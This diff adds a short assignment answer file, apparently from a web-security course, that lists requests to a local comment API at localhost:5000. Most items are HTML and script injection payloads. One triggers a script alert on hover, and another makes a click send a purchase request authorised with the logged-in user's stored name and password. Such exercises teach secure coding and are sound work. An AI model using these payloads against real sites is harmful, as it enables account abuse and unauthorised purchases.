@@ -1,0 +1,63 @@
+N01
+Sent using Postman, but the body can also be directly entered into the comment UI.
+POST http://localhost:5000/api/WriteComment
+Content-Type: application/json
+Content-Length: 65
+Host: localhost:5000
+
+
+{"comment": "<b><i>This should be in italic and in bold</i></b>"}
+
+
+N02
+Sent using Postman, but the body can also be directly entered into the comment UI.
+POST http://localhost:5000/api/WriteComment
+Content-Type: application/json
+Content-Length: 96
+Host: localhost:5000
+
+
+{"comment": "<img src='https://cdn.pixabay.com/photo/2015/04/23/22/00/tree-736885__480.jpg' />"}
+
+
+N03
+Sent using Postman, but the body can also be directly entered into the comment UI.
+POST http://localhost:5000/api/WriteComment
+Content-Type: application/json
+Content-Length: 73
+Host: localhost:5000
+
+
+{"comment": "<b onmouseover=\"alert('Script attack!')\">Hover here!</b>"}
+
+
+N04
+The frontend uses local variables to store this information to keep track of a user's login status, 
+scripts could be injected and used to grab a logged in user's details and use those details to send requests to the backend.
+
+
+N05
+Sent using Postman, but the body can also be directly entered into the comment UI.
+POST http://localhost:5000/api/WriteComment
+Content-Type: application/json
+Content-Length: 212
+Host: localhost:5000
+
+
+{"comment": "<b onclick=\"{fetch('http://localhost:5000/api/PurchaseSingleItem/156571347', {headers:{'Authorization': 'Basic ' + btoa(globalUserName+ ':' + globalPassword) }})}\">Click Here for CSRF Attack!</b>"}
+
+
+N06
+N/a
+
+
+C01
+madelyn
+
+
+C02
+N/a
+
+
+C03
+N/a
